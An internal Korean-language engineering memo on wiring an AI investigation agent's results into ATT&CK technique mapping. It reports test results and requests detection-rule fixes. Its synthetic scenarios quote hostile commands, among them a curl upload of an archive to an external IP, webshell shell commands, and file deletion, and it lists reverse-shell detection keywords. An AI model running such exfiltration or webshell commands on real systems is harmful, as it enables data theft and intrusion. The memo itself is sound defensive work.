# 조사 에이전트 ↔ ATT&CK 매핑 통합 결과와 규칙 보완 요청 (2026-09-27)

받는 사람: 어택 매핑 팀 (A 엔진·B 규칙·C Kill Chain/보고서 담당)
작성: 조사 에이전트 담당 (희진)
브랜치: `feature/investigation-attack-mapping` (조사 에이전트 `feature/Agentic-SOC-Investigation-Agent` + `feature/ATT&CK-test` 병합)

## 1. 요약

- `feature/ATT&CK-test`를 조사 에이전트 브랜치에 **충돌 없이 병합**했고, `attack_mapping/`·`reporting/` 코드는 **한 줄도 바꾸지 않았습니다.**
- `python main.py`가 조사 결과 JSON을 저장한 직후 매핑까지 이어서 실행합니다. 로컬·실제 LLM·EC2(Python 3.10)에서 모두 오류 없이 동작했습니다.
- 매핑 **코드는 문제가 없었습니다.** 다만 실제 LLM이 쓴 조사 결과로 돌려 보니 **규칙에 없거나 키워드가 어긋나서 빠지는 기법**이 있어, 규칙(B) 보완을 요청드립니다(4장).

## 2. 통합 방식

```
python main.py
  → 조사 (agent/)                         → results/<investigation_id>_<UTC시각>.json 저장
  → main.run_attack_mapping(저장 경로)     → attack_mapping/cli.py process_file(경로, ALL_RULES, results/attack_mapping)
       → engine.map_investigation → killchain.build_kill_chain → reporting.build_final_report
       → results/attack_mapping/<incident_id>_attack_mapping.json, <incident_id>_final_report.json
```

- 여러분 CLI의 `process_file()`을 **그대로** 부릅니다. 메모리의 dict가 아니라 저장된 파일 경로를 넘기므로, 나중에 `python -m attack_mapping.cli`로 다시 돌린 결과와 같습니다.
- 매핑에서 예외(`OSError`/`ValueError`/`RecursionError`)가 나면 `main.py`가 안내만 출력하고 다음 사건을 계속 조사합니다. 조사 JSON은 그 전에 이미 저장돼 있습니다.
- 콘솔에는 조사 보고서 아래에 `ATT&CK Mapping: <상태>`, Kill Chain 순서의 기법·시각·근거 증거, 저장 경로를 출력합니다.
- **`reporting/`은 최상위에 그대로 둡니다.** `attack_mapping/` 아래로 옮기는 안도 검토했지만, 이후 대응(Response) 단계 결과까지 합칠 최종 보고서 자리라 매핑 폴더 안에 두면 의존 방향이 꼬입니다. 대응 단계가 생기면 `build_final_report()` 호출을 `cli.py`에서 `main.py`로 옮기는 것을 같이 정했으면 합니다.
- 조사 쪽 추가 파일: `main.py`(연결), `tests/test_main_attack_mapping.py`(연결 테스트 4개). 문서: README, CLAUDE.md, AGENTS.md, docs/AGENT_FLOW.md(`[46]` 단계), tests/README.md.

## 3. 검증 결과

| 환경 | 항목 | 결과 |
|---|---|---|
| 로컬 (Python 3.13) | `python -m pytest -q` | 310 passed (조사 132 + 매핑 174 + 연결 4) |
| 로컬 | `python -m scripts.verify_attack_mapping_abc` | 297 passed / 0 failed |
| 로컬 | 기존 조사 결과 JSON 11건 일괄 매핑 | 11건 모두 오류 없음 |
| 로컬 + 실제 Gemini | 웹셸·유출 합성 시나리오 조사 → 매핑 | 둘 다 THREAT_CONFIRMED, `mapped`, 파일 저장 정상 (기법 수는 4장) |
| EC2 (Python 3.10) + 실제 Gemini | pytest / verify 스크립트 | 310 passed / 297 passed·0 failed (시간대 정렬 검사 포함) |
| EC2 + 실제 Gemini | `python3 main.py` (실제 트래픽 2건) | SSH 실패 4회 → FALSE_POSITIVE → `not_applicable`, XML-RPC POST 150회 → THREAT_CONFIRMED → `mapped` T1110 |

## 4. 규칙(B) 보완 요청

아래 "실제 입력"은 실제 LLM이 만든 조사 결과의 문장을 그대로 옮긴 것입니다. 매칭은 이 문장에 키워드가 있는지로 정해지므로, 같은 사건이라도 LLM 표현에 따라 결과가 달라질 수 있습니다.

### 4-1. 유출 단계가 비어 있음 — 유출 규칙이 T1041(C2) 하나뿐

- 시나리오: 정상 로그인 → `tar -czf`로 민감 디렉터리 압축 → `curl -T`로 외부 서버 업로드
- 판정: THREAT_CONFIRMED, `attack_type` = "데이터 유출(Data Exfiltration)"
- 실제 입력 (EVID-007): "압축 파일을 외부 서버(91.203.6.44)로 전송하는 명령(curl -T /tmp/site_backup.tar.gz http://91.203.6.44/upload)이 실행된 사실이 audit 로그에서 확인됨"
- 실제 입력 (EVID-004): "Suricata 경보로 대용량 아웃바운드 데이터 전송(Large Outbound Data Transfer)이 목적지 91.203.6.44로 발생한 사실이 …"
- 결과: **T1560(압축)만 매핑, Exfiltration 단계 없음.** T1041은 `required_context_keywords`(C2 채널 문맥)가 필수이고 `allow_verdict_hits=False`라 판정 문구로도 붙지 않습니다. 이 동작 자체는 설계 의도(`exfiltration_without_c2` 검증 케이스)와 같습니다.
- 제안: C2 조건 없이 받을 유출 기법을 추가해 주세요. 예: **T1048(Exfiltration Over Alternative Protocol)**, HTTP 평문이면 T1048.003. 명령 키워드 `curl -T`, `curl --upload-file`과 "외부 서버로 전송", "Large Outbound Data Transfer"를 쓰고, T1041은 지금처럼 C2 문맥이 있을 때만 붙이면 됩니다.

### 4-2. 웹 서버 계정의 셸 실행이 T1059.004로 안 붙음 — 키워드 표현 차이

- 시나리오: shell.php 업로드 → `?cmd=` 요청 → www-data가 `sh -c id;whoami;uname -a` 실행
- 실제 입력 (EVID-003): "웹 서버 계정(www-data)이 ppid 1200 하위에서 sh -c id;whoami;uname -a 및 개별 명령어(id, whoami, uname)를 실행한 행위가 audit 로그에서 확인됨"
- 실제 `attack_type`: "웹셸 업로드 및 명령어 실행"
- 결과: **T1505.003만 매핑, EVID-003은 unmatched.**
  - 현재 T1059.004 키워드는 "웹셸 명령 실행", "셸을 스폰", "php-fpm이 셸", "reverse shell", `bash -i`입니다.
  - LLM은 "명령**어** 실행", "sh -c … 실행"으로 써서 한 글자 차이로 빠졌습니다.
- 제안: 문장 키워드를 늘리기보다, 이미 있는 스키마 기능을 쓰는 방법을 제안합니다. 명령 키워드 `sh -c`에 `required_context_keywords`로 "www-data", "웹 서버 계정", "php-fpm" 같은 주체 문맥을 거는 방식입니다(같은 긍정 절 안에 있어야 매칭). 일반 계정의 `sh -c`는 붙지 않습니다.

### 4-3. 정보 수집·흔적 삭제·웹 취약점 악용 규칙 없음 또는 미매칭

| 행위 (위 두 시나리오) | 기법 후보 | 현재 |
|---|---|---|
| www-data의 `whoami`, `id`, `uname -a` | T1033 System Owner/User Discovery, T1082 System Information Discovery | 카탈로그에 없음 |
| 업로드 후 `rm -f /tmp/site_backup.tar.gz` | T1070.004 File Deletion | 카탈로그에 없음. 이번 실행에서는 이 행위가 증거가 아니라 타임라인에만 남아서, 규칙이 있어도 증거 매칭은 안 됐을 것 (조사 쪽에서도 확인할 부분) |
| 업로드 기능으로 shell.php 배치 | T1190 Exploit Public-Facing Application | 규칙은 있지만 키워드("업로드 취약점 악용" 등)가 LLM 문장에 없어 미매칭. "웹셸 업로드"를 T1190 근거로 볼지는 팀 판단이 필요 |

규칙을 추가할 때 "whoami" 같은 흔한 명령은 정상 관리자도 쓰므로, 4-2처럼 웹 서버 계정 문맥을 요구하는 방식을 권합니다.

### 4-4. 웹 인증 대입(XML-RPC)이 판정 문구로만 T1110에 붙음 — 근거 증거·시각이 비어 있음

- EC2 실제 트래픽: 외부 IP 한 곳이 `/xmlrpc.php`로 POST 150회 → THREAT_CONFIRMED, `attack_type` = "웹 인증 무차별 대입/XML-RPC 남용 시도"
- 결과: T1110이 붙었지만 `matched_by = ["verdict"]`뿐이라 Kill Chain 줄에 **시각과 `evidence_ids`가 없습니다.**
- 원인: T1110 `evidence_keywords`가 SSH 표현("비밀번호 인증 실패", "failed password" 등)뿐이라, 웹 증거 문장 "/xmlrpc.php 경로로 POST 요청 150건"과 연결되지 않습니다.
- 제안: 웹 인증 대입용 증거 키워드를 추가해 주세요. 예: "xmlrpc.php", "wp-login.php"에 "POST", "반복", "대량" 문맥을 거는 방식입니다. 조사 쪽은 원칙 9에서 인증·XML-RPC POST 10회 이상을 기준으로 판정합니다.
- 또 하나 알아 두실 점이 있습니다. provenance가 `incomplete`인 사건은 verdict 매칭이 꺼집니다. 그래서 이런 사건이 `incomplete`였다면 기법이 0개(`no_techniques_matched`)가 됐을 것입니다(5-1 참고).

## 5. 조사 에이전트 쪽에서 검토 중인 것 (매핑 결과에 영향)

### 5-1. "0건 → 활동 없음" 증거 때문에 provenance가 `incomplete`가 됨

- 지금까지 `incomplete`가 된 조사 결과는 **전부** "해당 IP의 네트워크 통신 없음", "후속 명령 실행 없음"처럼 조회 결과 0건을 근거로 쓴 증거에 원본 줄(raw_refs)이 없어서 생겼습니다.
- 그러면 매핑이 `partial`이 되고 verdict 매칭이 꺼집니다. 원본 참조가 있는 다른 증거는 정상 매핑됩니다.
- 조사 쪽에서 이런 증거를 "원본 참조 누락"과 구분하는 방법을 검토하겠습니다. 결정되면 알려 드리겠습니다. 엔진 쪽 변경은 요청하지 않습니다.

### 5-2. 문장이 아닌 구조화 값으로 매핑하는 방안 (장기)

- 조사 도구는 이미 코드로 계산한 기준값(`rule_checks`)을 갖고 있습니다.
  - SSH 무차별 대입 기준(원칙 7)
  - 웹 요청 반복·스캔 기준(원칙 9)
  - 웹 서버 계정의 셸·의심 명령 실행(`audit_post_exploitation`)
  - 명령 인자에 나온 외부 IP(`external_ips`)
- 지금은 이 값들이 조사 결과 JSON에 남지 않아 매핑이 LLM 문장에만 의존합니다.
- 결과 JSON에 넣고 규칙이 이 값을 보게 하면 LLM 표현과 무관하게 재현됩니다. 두 팀이 JSON 형식을 같이 정해야 하는 일이라, 필요하다고 보시면 따로 논의했으면 합니다.

## 6. 앞으로 작업할 때 부탁드리는 것

- **입력 필드 약속:** 엔진이 읽는 조사 결과 필드는 조사 쪽 `agent/report.py`가 만듭니다.
  - `evidence_chain[].evidence_id`·`sequence`·`time`·`event_type`·`description`·`raw_refs`
  - `provenance.status`·`evidence_without_raw_refs`·`ambiguous_raw_refs`·`issues`
  - `raw_ref_locations`, `final_verdict.verdict`·`attack_type`

  한쪽에서 바꾸면 다른 쪽 검증에 걸리니 미리 알려 주세요. 조사 쪽은 `tests/test_attack_mapping_engine.py::test_actual_investigation_report_contract`와 `tests/test_main_attack_mapping.py`로 확인합니다.
- **규칙을 바꾸면** `tests/test_main_attack_mapping.py`도 같이 돌려 주세요. 이 테스트는 실제 `ALL_RULES`로 웹셸 사건이 T1059.004 → T1505.003 순서로 나오는지 봅니다(`/dev/tcp`, "역방향 셸" 문장 사용).
- **작업 기준 브랜치:** 이 통합 브랜치가 팀 레포에 올라간 뒤에는 이 브랜치를 기준으로 작업해 주시면 병합이 편합니다.
- **파일 이름(선택):** 조사 결과는 `INV-<incident>-<날짜>-001_<UTC시각>.json`인데 매핑 결과는 `<incident_id>__N_*.json`이라 이름만으로는 짝이 안 맞습니다. 파일 안의 `investigation_id`로 연결은 됩니다. 입력 파일 이름 기준으로 바꿀지는 편하신 대로 정해 주세요.
